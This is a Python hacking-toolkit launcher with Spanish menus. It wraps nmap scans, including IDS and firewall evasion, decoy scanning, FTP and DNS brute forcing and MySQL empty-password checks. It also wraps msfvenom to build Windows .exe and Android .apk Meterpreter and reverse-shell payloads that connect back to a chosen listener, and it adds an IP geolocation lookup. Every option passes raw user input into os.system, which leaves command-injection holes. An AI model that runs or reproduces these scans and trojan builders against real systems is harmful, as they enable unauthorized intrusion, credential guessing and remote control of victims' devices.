import os
import colorama
import time
from colorama import Fore
import socket
import colorama
import requests
import urllib.request
import sys
import webbrowser
import random
from colorama import Fore, Back, Style
from sys import stdout
colorama.init(autoreset=True)

############### Banner ###############

banner = Fore.RED + """

                                   ,                                            
                                    *#    @                                     
                                      @/   @&                                   
                                       @@%  %@&                                 
                         (@@&.  @@@     (@@@ .@@@                               
                   @@@@@@@@@@@@@@@@@@@@#. @@@@.%@@@.                            
                .*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                          
             .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                       
            ,@@@@@@@@@@@&*           .%@@@@@@@@@@@@@@@@@@@@.                    
         @@@@@@@@@@@@*                     %@@@@@@@@@@@@@@@@@/                  
           (@@@@@@@#                          /@@@@@@@@@@@.@@@@                 
         .@@@@@@@@#                              @@@@@@@@@@(,@@@%               
        @@@@@@@@@@,                                @@@@@@@@@@@@@@@.             
           @@@@@@@#                                  @@@@@@@@@@@@@,             
          /@@@@@@@@%                                    (@@@@@@@@@@.            
          @%.&@@@@@@@.                                      &@@@@@@@@/          
              @@@@@@@@@*                                       @@@@@@@@@%       
              *@@#@@@@@@@@,                                      @@@@@@@@*      
                    (@@@@@@@@&                                    @@@@@@        
                        (@@@@@@@@@/                              ,@@@.          
                            .&@@@@@@@@@%                                        
                                  *@@@@@@@@@*                                   
                                        %@@@@@@&                                
                                            .@@@@@%                             
                                                (@@@&                           
                                                   @@@.                         
                                                     @@/                        
                                                      &@                        
                                                       &                        
                                                       .                        
"""

############### Banner ###############

# coded by l1te and cabeson sin z!

############### Nmap code ###############

def nmap():
    os.system("clear")
    print (Fore.RED + "  _________________________________________________________________________________________ ")
    print (Fore.RED + " | [0] Nmap help                                                                           |")
    print (Fore.RED + " | [1] Scanear 1000 puertos famosos                                                        |")
    print (Fore.RED + " | [2] Scanear todos los puertos existentes                                                |")
    print (Fore.RED + " | [3] Escaneo de servicios estandar                                                       |")
    print (Fore.RED + " | [4] Escaneo de servicios agreviso                                                       |")
    print (Fore.RED + " | [5] Scaneo Detallado                                                                    |")
    print (Fore.RED + " | [6] Scanear de OS                                                                       |")
    print (Fore.RED + " | [7] Scanear SubRed                                                                      |")
    print (Fore.RED + " | [8] Scanear un solo puerto                                                              |")
    print (Fore.RED + " | [9] Scaneo silencioso - No deja rastros en el servidor...                               |")
    print (Fore.RED + " | [10] Host activos en la web + trace route (RH)                                          |") 
    print (Fore.RED + " | [11] Host activos en una red - (LH)                                                     |") 
    print (Fore.RED + " | [12] Evadir IDS                                                                         |")
    print (Fore.RED + " | [13] Confundir al firewall - [Datos importantes]                                        |") 
    print (Fore.RED + " | [14] UUtilizar sueñuelos - (Anti-IDS)                                                   |")  
    print (Fore.RED + " | [15] Detectar Firewall                                                                  |")
    print (Fore.RED + " | [16] Deteccion de Firewall - (exacto)                                                   |")
    print (Fore.RED + " | [17] Escaneo agresivo                                                                   |")
    print (Fore.RED + " | [18] Escanear todos los puertos - (TCP)                                                 |")
    print (Fore.RED + " | [19] Escanear todos los puertos - (UDP)                                                 |")
    print (Fore.RED + " | [20] Mandar paquetes - (ICMP)                                                           |")
    print (Fore.RED + " |_________________________________________________________________________________________|")
    print (Fore.RED + " |                                                                                         |")
    print (Fore.RED + " | [001] FTP brute force  -- (Script usado para la fuerza bruta en el protocolo ftp)       |")
    print (Fore.RED + " | [002] Safe script nmap -- (Script que permite un escaneo silencioso)                    |")
    print (Fore.RED + " | [003] Vuln script --  (Script que busca vulnerabilidades)                               |")
    print (Fore.RED + " | [004] Dns Search --  (Script utilizado para la busqueda de subdominios)                 |")
    print (Fore.RED + " | [005] MySql DB -- (Script que nos permite buscar cotraseñas en servicios mysql)         |")
    print (Fore.RED + " |_________________________________________________________________________________________|")
    print("")

  ######################## All opciones - Nmap ##########################

    opcion = input(Fore.RED + ' Seleciona una opcion\n >> ')
    if opcion == "1":
        os.system("clear")
        normal = input(Fore.RED + "Que ip quieres scanear?\n>> " "")
        print(Fore.RED)
        os.system("nmap --top-ports 1000 " + (normal))
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu()

 ######################## Opcion 2 ##########################

    elif opcion == "2":
        os.system("clear")
        psa = input(Fore.RED + "Introduzca una IP\n>> " "")
        os.system("nmap -p- " + (psa))
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu()

 ######################## Opcion 3 ##########################

    elif opcion == "4":
        os.system("clear")
        agresivo = input(Fore.RED + "Introduzca una ip u pagina web ( e.j https://googlesource.com )\n>> ")
        os.system("nmap -sV -T5"+agresivo)
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu()

 ######################## Opcion 4 ##########################

    elif opcion == "3":
        os.system("clear")
        normal = input(Fore.RED + "Introduzca una ip u pagina web ( e.j https://googlesource.com )\n>> ")      
        os.system("nmap -sV  "+normal)  
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu() 

 ######################## Opcion 5 ##########################

    elif opcion == "5":
        os.system("clear")
        s = input(Fore.RED + "Introduzca una ip\n>> ")
        os.system(f'nmap -Pn -A -v {s}/24')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu()

 ######################## Opcion 6 ##########################

    elif opcion == "6":
        os.system("clear")
        systemx4 = input(Fore.RED + "Introduzca una ip u pagina web ( e.j https://googlesource.com )\n>> ")
        os.system("nmap -O -sV "+systemx4)
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu()

 ######################## Opcion 7 ##########################

    elif opcion == "7":
        os.system("clear")
        subred = input(Fore.RED + "Introduzca una ip\n>> ")
        puertoSub = input(Fore.RED + "Introduzca un puerto ( usar abajo del 32 )\n>> ")
        os.system(f'nmap -sP {subred}/{puertoSub}')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu()

 ######################## Opcion 8 ##########################

    elif opcion == "8":
        os.system("clear")
        ip = (input(Fore.RED + "Introduzca una Ip \n>> "))
        port = str(input(Fore.RED + "Introduzca un puerto \n>> "))
        os.system(f'nmap -p{port} {ip} ')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu()

 ######################## Opcion 9 ##########################

    elif opcion == "9":
        os.system("clear")
        ipyp = input(Fore.RED + "Introduzca una ip\n>> ")
        print(Fore.RED)
        os.system(f'nmap -sS -O {ipyp}')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu() 

 ######################## Opcion 10 ##########################

    elif opcion == "10":
        os.system("clear")
        slut = input(Fore.RED + "Introduzca una ip u pagina web ( e.j https://googlesource.com )\n>> ")
        os.system(f'nmap -sn --packet-trace --send-ip -v {slut}')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ') 
        menu()  

 ######################## Opcion 11 ##########################

    elif opcion == "11":
        os.system("clear")
        njs = input(Fore.RED + "Introduzca una ip\n>> ")         
        os.system(f'nmap -sn -v {njs}')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu()

 ######################## Opcion 12 ##########################

    elif opcion == "12":
        os.system("clear")
        idsEvadir = input(Fore.RED + ("Introduzca una ip ( Puede que sea lento por que intentara evadir los ids ) \n>> "))
        os.system(f'nmap -n -sS -v -f {idsEvadir}')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu()

 ######################## Opcion 13 ##########################

    elif opcion == "13":
        os.system("clear")
        ConfundirFirewall = input(Fore.RED + ("Introduzca una ip\n>> "))
        os.system(f'nmap --mtu 24 {ConfundirFirewall}')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu()

 ######################## Opcion 14 ##########################

    elif opcion == "14":
        os.system("clear")
        señuelo1 = input(Fore.RED + ("Introduzca una ip\n>> "))
        os.system(f'nmap -n -D 1.1.1.1,8.8.8.8 {señuelo1}')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu()

 ######################## Opcion 15 ##########################

    elif opcion == "15":
        os.system("clear")
        señuelo2 = input(Fore.RED + ( "Introduzca una ip u pagina web ( e.j https://googlesource.com )\n>> "))
        Port = input(Fore.RED + ("Intoduzca los puertos que va a usar (Si no sabe cuales pruebe con 80,443)\n>> "))
        os.system(f'nmap -p{Port} --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.detectBodyChanges" {señuelo2}')
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu()

 ######################## Opcion 16 ##########################

    elif opcion == "16":
        os.system("clear")
        señuelo = input(Fore.RED + ( "Introduzca una ip u pagina web ( e.j https://googlesource.com )\n>> "))
        Port = input(Fore.RED + ("Intoduzca los puertos que va a usar (Si no sabe cuales pruebe con 80,443)\n>> "))
        os.system(f"nmap -p{Port} --script http-waf-fingerprint {señuelo}")
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu()

 ######################## Opcion 17 ##########################

    elif opcion == "17":
        os.system("clear")
        AgresivC = input(Fore.RED + ("Introduzca una ip\n>> "))
        os.system(f"nmap -sS -T insane {AgresivC}")
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu()


 ######################## Opcion 18 ##########################

    elif opcion == "18": 
        os.system("clear")
        tcpP = input(Fore.RED + ("Introduzca una ip\n>> "))
        os.system(f"nmap -F -sT {tcpP}")
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu()

  ######################## Opcion 19 ##########################

    elif opcion == "19": 
        os.system("clear")
        Udp = input(Fore.RED + ("Introduzca una ip\n>> "))
        os.system(f"nmap -sU {Udp}")
        time.sleep(15)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu()

  ######################## Opcion 20 ##########################   
    
    elif opcion == "20":
        os.system("clear")
        icmp = input(Fore.RED + ("Introduzca una ip\n>> "))
        paquetes = int(input(Fore.RED + ("Introduzca el numero de paquetes\n>>")))
        os.system(f"nping -c {paquetes} {icmp}") 
        time.sleep(15)
        input(Fore.RED + "Presiona Cualquer Letra Para Volver Al Menu\n>> ")
        menu()  

 ######################### Nmap-Scripts ###############################
    elif opcion == "001":
        os.system('clear')
        target = input(Fore.RED + 'Introduzca una ip\n>>')
        Port = input(Fore.RED + ("Intoduzca los puertos que va a usar (Si no sabe cuales pruebe con 21)\n>> "))
        os.system(f'nmap --script ftp-brute -p 21 {target}')
        time.sleep(15)
        input(Fore.RED + "Presiona Cualquer Letra Para Volver Al Menu\n>> ")
        menu()  

    elif opcion == "002":
        os.system('clear')
        target = input(Fore.RED + 'Introduzca una ip\n>>')
        os.system(f'nmap -f --script safe {target}')
        time.sleep(15)
        input(Fore.RED + "Presiona Cualquer Letra Para Volver Al Menu\n>> ")
        menu()  

    elif opcion == "003":
        os.system('clear')
        target = input(Fore.RED + 'Introduzca una ip\n>>')
        os.system(f'nmap -f --script vuln {target}')
        time.sleep(15)
        input(Fore.RED + "Presiona Cualquer Letra Para Volver Al Menu\n>> ")
        menu()  

    elif opcion == "004":
        os.system('clear')
        target = input(Fore.RED + 'Introduzca una ip\n>>')
        Port = input(Fore.RED + ("Intoduzca los puertos que va a usar (Si no sabe cuales pruebe con 80,443)\n>> "))
        os.system(f'nmap -p{Port} --script dns-brute {target}')
        time.sleep(15)
        input(Fore.RED + "Presiona Cualquer Letra Para Volver Al Menu\n>> ")
        menu()  

    elif opcion == "005":
        os.system('clear')
        target = input(Fore.RED + 'Introduzca una ip\n>>')
        Port = input(Fore.RED + ("Intoduzca los puertos que va a usar (Si no sabe cuales pruebe con 3306)\n>> "))
        os.system(f'nmap -p{Port} --script mysql-empty-password {target}')
        time.sleep(15)
        input(Fore.RED + "Presiona Cualquer Letra Para Volver Al Menu\n>> ")
        menu()  


 ######################## Panel de ayuda - Nmap ##########################

    elif opcion == "0":
        os.system('clear')
        print('Buscando Ayuda....')
        time.sleep(2)
        os.system('nmap -help')
        time.sleep(5)
        input(Fore.RED + 'Presiona Cualquer Letra Para Volver Al Menu\n>> ')
        menu() 
    else:
        print(Fore.RED + ("no has puesto una opcion correcta!"))
        print(Fore.RED + ("Saliendo..."))    
      


 ######################## Payloads - Reverse_shell - Meterpreter - And more ##########################

def msfvenom():
    os.system('clear')
    print(Fore.RED + '[1] Payload meterpreter windows ')
    print(Fore.RED + '[2] Payload meterpreter android')
    print(Fore.RED + '[3] Payload reverse_shell windows')
    print(Fore.RED + '[4] Payload reverse_shell android')
    print('')
    opcion = input(Fore.WHITE + 'Selecciona una opcion\n>> ')

 ######################## Payloads - Meterpreter1 ##########################

    if opcion == '1':
        os.system('clear') 
        os.system("sudo su")
        os.system("clear")   
        ip = input(Fore.RED + 'Selecciona una ip\n>> ')
        puerto = input(Fore.RED + 'Selecciona un puerto\n>> ')
        nombre = input(Fore.RED + 'Selecciona el nombre del payload\n>> ')
        os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LPORT={puerto} LHOST={ip} -f exe -o {nombre}.exe')

 ######################## Payloads - Meterpreter2 ##########################

    elif opcion == '2':
        os.system('clear') 
        os.system("sudo su")
        os.system("clear")   
        ip = input(Fore.RED + 'Ingresa tu ip privada\n>> ')
        puerto = input(Fore.RED + 'Selecciona un puerto\n>> ')
        nombre = input(Fore.RED + 'Selecciona el nombre del payload\n>> ')
        os.system(f'msfvenom -p android/meterpreter/reverse_tcp LPORT={puerto} LHOST={ip} -f raw -o {nombre}.apk')

 ######################## Payloads - Meterpreter2 ##########################

    elif opcion == ('3'):
        os.system('clear') 
        os.system("sudo su")
        os.system("clear")   
        ip = input(Fore.RED + 'Ingresa tu ip privada\n>> ')
        puerto = input(Fore.RED + 'Selecciona un puerto\n>> ')
        nombre = input(Fore.RED + 'Selecciona el nombre del payload\n>> ')
        os.system(f'msfvenom -p windows/shell/reverse_tcp LPORT={puerto} LHOST={ip} -f exe -o {nombre}.exe')
    elif opcion == ('4'):
        os.system('clear') 
        os.system("sudo su")
        os.system("clear")   
        ip = input(Fore.RED + 'Ingresa tu ip privada\n>> ')
        puerto = input(Fore.RED + 'Selecciona un puerto\n>> ')
        nombre = input(Fore.RED + 'Selecciona el nombre del payload\n>> ')
        os.system(f'msfvenom -p android/shell/reverse_tcp LPORT={puerto} LHOST={ip} -f raw -o {nombre}.apk')
    else:
        print(Fore.RED + ("no has puesto una opcion correcta!"))
        print(Fore.RED + ("Saliendo..."))

 ######################## Creadores, Cabeson sin z y l1te ##########################

def creadores():
    print(Fore.RED+('  [Youtube]          \n>>[1] cabeson sin z  \n>>[2] l1te'))
    print()
    print(Fore.RED+('  [Github]          \n>>[3] cabeson sin z  \n>>[4] l1te'))
    time.sleep(0.50)
    opcion = input(Fore.RED + 'Selecciona una opcion\n>> ')
    if opcion == '1':
     os.system("cls")
     webbrowser.open("https://youtube.com/channel/UCyxot7tzc9MO10KUjtZLEVA")
    elif opcion == '2':
     os.system("cls")
     print('Abriendo navegador...')
     webbrowser.open("https://www.youtube.com/channel/UCQMA-ikb9bbCDVBKe-xjbfA")
    elif opcion == '3':
     os.system("cls")
     print('Abriendo navegador...')
     webbrowser.open("https://github.com/cabesonwiliams")
    elif opcion == '4':
     os.system("cls")
     print('Abriendo navegador...')
     webbrowser.open("https://github.com/zl1te")
    else:
        print(Fore.RED + ("no has puesto una opcion correcta!"))
        print(Fore.RED + ("Saliendo..."))


    
 ######################## IP-INFO ##########################

def ipinfo():
    os.system("cls")
    print(f'''
 _  _      _____ ____        ____  ____  _     ____  ____  _____
/ \/ \  /|/    //  _ \      / ___\/  _ \/ \ /\/  __\/   _\/  __/
| || |\ |||  __\| / \|_____ |    \| / \|| | |||  \/||  /  |  \    
| || | \||| |   | \_/|\____\\___ || \_/|| \_/||    /|  \_ |  /_ 
\_/\_/  \|\_/   \____/      \____/\____/\____/\_/\_\\____/\____\
                                                                      ''')

    gr = input("Ingresa la ip\n>> ") #ip xd

    scd = requests.get(f'https://ipapi.co/{gr}/json') #De dedonde ascara la info de la ip


    ips = scd.json() #json

    os.system("cls")

    print(Fore.WHITE)
    if ips:
     print(Fore.RED + " ")
     print("ip: " + ips['ip'])
     print("Ciudad: " + ips['city'])
     print("Region: " + ips['region'])
     print("Codigo de region: " + ips['region_code'])
     print("Pais: " + ips['country_name'])
     print("Capital: " + ips['country_capital'])
     print("Dominio: " + ips['country_tld'])
     print("Codigo del contiente: " + ips['continent_code'])
     print("Codigo postal: " + ips['postal'])
     print("zona horaria: " + ips['timezone'])
     print("CÃƒÂ³digo de llamada del paÃƒÂ­s: " + ips['country_calling_code'])
     print("Divisa: " + ips['currency_name'])
     print("Lenguajes que se hablan en ese pais: " + ips['languages'])
     print("org: " + ips['org'])
     print("")
     finish = input("Preciona enter para acabar!")
     print(Fore.RESET)
     os.system('clear')
    else:
        print(Fore.RED + ("no has puesto una opcion correcta!"))
        print(Fore.RED + ("Saliendo..."))

def exit():
    print('Saliendo......')
    time.sleep(1)
    os.system("cls")
    sys.exit(1)

 ######################## Menu - ez ##########################

def menu():
    print(banner)
    time.sleep(0.5)
    print(Fore.RED + "\n 1 >> Nmap")
    time.sleep(0.5)
    print(Fore.RED + "\n 2 >> MSFvenom")
    time.sleep(0.5)
    print(Fore.RED + "\n 3 >> Ip-info")
    time.sleep(0.5)
    print(Fore.RED + "\n 4 >> Creadores")
    time.sleep(0.5)
    print(Fore.RED + "\n 5 >> Salir")
    time.sleep(0.5)
    lock = input(Fore.RED + '\n>> ')

    if lock == "1":
        nmap()
    if lock == "2":
        msfvenom()
    if lock == "3":
        ipinfo()
    if lock == "4":
        creadores()
    if lock == "5":
        exit()
    else:
        print(Fore.RED + ("no has puesto una opcion correcta!"))
        print(Fore.RED + 'Volviendo al menu....')
        time.sleep(2)
        menu()
        
menu()